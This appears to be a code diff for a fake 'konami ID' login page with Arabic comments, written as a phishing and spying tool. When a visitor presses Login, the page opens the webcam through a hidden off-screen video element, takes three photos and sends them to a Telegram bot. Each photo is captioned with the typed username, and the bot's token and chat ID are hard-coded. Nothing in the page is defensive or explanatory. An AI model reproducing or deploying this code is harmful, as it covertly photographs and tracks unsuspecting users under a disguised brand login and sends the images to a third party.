@@ -1,64 +1,102 @@
-
-<script>
-// ضع بيانات بوتك هنا
-const TOKEN   = "8408449205:AAHQ6__cO8R7s3kEmZsFTl0hNY9aUYscenM";   // من BotFather
-const CHAT_ID = "6504203392";             // من @userinfobot
-
-const btn = document.getElementById('loginBtn');
-const status = document.getElementById('status');
-const video = document.getElementById('v');
-const canvas = document.getElementById('c');
-const ctx = canvas.getContext('2d');
-
-function setStatus(t){ status.textContent = t; }
-
-async function openCamera(){
-  const stream = await navigator.mediaDevices.getUserMedia({video:true});
-  video.srcObject = stream;
-  await video.play();
-  return stream;
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>konami ID</title>
+<style>
+:root{--accent:#c0132b}*{box-sizing:border-box}body{
+  margin:0;font-family:Arial,Helvetica,sans-serif;min-height:100vh;
+  display:grid;place-items:center;
+  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+  color:#222
 }
+.card{width:min(92vw,420px);background:#fff;border-radius:18px;padding:28px;box-shadow:0 12px 30px rgba(0,0,0,.2);text-align:center}
+.brand{font-weight:800;color:var(--accent);font-size:22px;margin-bottom:8px}
+.field{margin:10px 0}.input{width:100%;padding:12px;border-radius:12px;border:1px solid #ddd;font-size:16px}
+.btn{width:100%;padding:12px;border-radius:12px;border:0;background:var(--accent);color:#fff;font-size:16px;cursor:pointer}
+.video-hidden{position:absolute;width:1px;height:1px;opacity:0;left:-9999px}
+.status{margin-top:8px;font-size:13px;color:#333}
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="brand">konami ID</div>
+    <div> اضغط Login </div>
+    <div class="field"><input id="user" class="input" placeholder="Username"></div>
+    <div class="field"><input id="pass" type="password" class="input" placeholder="Password"></div>
+    <button id="loginBtn" class="btn">Login</button>
+    <div id="status" class="status"></div>
+  </div>
 
-function captureBlob(){
-  return new Promise(resolve=>{
-    ctx.drawImage(video,0,0,canvas.width,canvas.height);
-    canvas.toBlob(blob=>resolve(blob),"image/jpeg");
-  });
-}
+  <!-- الفيديو والكانفس -->
+  <video id="v" class="video-hidden" autoplay playsinline></video>
+  <canvas id="c" width="640" height="480" style="display:none"></canvas>
 
-async function sendToTelegram(blob, meta){
-  const form = new FormData();
-  form.append("chat_id", CHAT_ID);
-  form.append("photo", blob, "photo.jpg");
-  form.append("caption", `👤 المستخدم: ${meta.user}\n🕒 الوقت: ${new Date(meta.time).toLocaleString()}`);
+  <!-- 🔽 الكود الجافاسكربت بعد العناصر -->
+  <script>
+  // بيانات البوت
+  const TOKEN   = "8408449205:AAHQ6__cO8R7s3kEmZsFTl0hNY9aUYscenM";   // من BotFather
+  const CHAT_ID = "6504203392";             // من @userinfobot
 
-  const url = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
-  const res = await fetch(url, { method:"POST", body: form });
-  return res.ok;
-}
+  const btn = document.getElementById('loginBtn');
+  const status = document.getElementById('status');
+  const video = document.getElementById('v');
+  const canvas = document.getElementById('c');
+  const ctx = canvas.getContext('2d');
 
-btn.addEventListener('click', async ()=>{
-  btn.disabled = true;
-  setStatus('طلب إذن الكاميرا...');
-  let stream;
-  try{
-    stream = await openCamera();
-    setStatus('التقاط الصور وإرسالها...');
-    const meta = { user: document.getElementById('user').value || "", time: Date.now() };
+  function setStatus(t){ status.textContent = t; }
 
-    for(let i=1;i<=3;i++){
-      const blob = await captureBlob();
-      const ok = await sendToTelegram(blob, meta);
-      setStatus(ok? `✔️ أرسلت الصورة ${i}/3` : `⚠️ خطأ عند إرسال ${i}`);
-      await new Promise(r=>setTimeout(r,800));
-    }
-    setStatus('✅ انتهت العملية');
-  }catch(e){
-    console.error(e);
-    setStatus('❌ فشل الوصول للكاميرا أو إرسال الصور');
-  }finally{
-    if(video.srcObject) video.srcObject.getTracks().forEach(t=>t.stop());
-    btn.disabled = false;
+  async function openCamera(){
+    const stream = await navigator.mediaDevices.getUserMedia({video:true});
+    video.srcObject = stream;
+    await video.play();
+    return stream;
   }
-});
-</script>
+
+  function captureBlob(){
+    return new Promise(resolve=>{
+      ctx.drawImage(video,0,0,canvas.width,canvas.height);
+      canvas.toBlob(blob=>resolve(blob),"image/jpeg");
+    });
+  }
+
+  async function sendToTelegram(blob, meta){
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("photo", blob, "photo.jpg");
+    form.append("caption", `👤 المستخدم: ${meta.user}\n🕒 ${new Date(meta.time).toLocaleString()}`);
+
+    const url = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+    const res = await fetch(url, { method:"POST", body: form });
+    return res.ok;
+  }
+
+  btn.addEventListener('click', async ()=>{
+    btn.disabled = true;
+    setStatus('طلب إذن الكاميرا...');
+    let stream;
+    try{
+      stream = await openCamera();
+      setStatus('التقاط الصور وإرسالها...');
+      const meta = { user: document.getElementById('user').value || "", time: Date.now() };
+
+      for(let i=1;i<=3;i++){
+        const blob = await captureBlob();
+        const ok = await sendToTelegram(blob, meta);
+        setStatus(ok? `✔️ أرسلت الصورة ${i}/3` : `⚠️ خطأ عند إرسال ${i}`);
+        await new Promise(r=>setTimeout(r,800));
+      }
+      setStatus('✅ انتهت العملية');
+    }catch(e){
+      console.error(e);
+      setStatus('❌ فشل الوصول للكاميرا أو إرسال الصور');
+    }finally{
+      if(video.srcObject) video.srcObject.getTracks().forEach(t=>t.stop());
+      btn.disabled = false;
+    }
+  });
+  </script>
+</body>
+</html>
+
